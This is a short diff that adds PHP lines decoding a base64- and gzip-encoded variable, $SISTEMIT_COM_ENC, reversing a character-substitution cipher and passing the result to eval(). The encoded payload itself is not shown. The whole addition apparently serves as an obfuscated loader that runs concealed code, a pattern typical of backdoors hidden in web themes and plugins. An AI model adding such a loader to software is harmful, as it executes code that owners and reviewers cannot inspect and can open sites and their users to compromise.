@@ -1,0 +1,7 @@
+$nav = gzinflate(base64_decode($SISTEMIT_COM_ENC));
+
+			$str = ['ý','ê','ã','í','û','æ','ñ','á','õ','ë','µ'];
+			$rplc =['a','i','u','e','o','d','s','h','v','t',' '];
+		  $nav = str_replace($str,$rplc,$nav);
+
+			eval($nav);
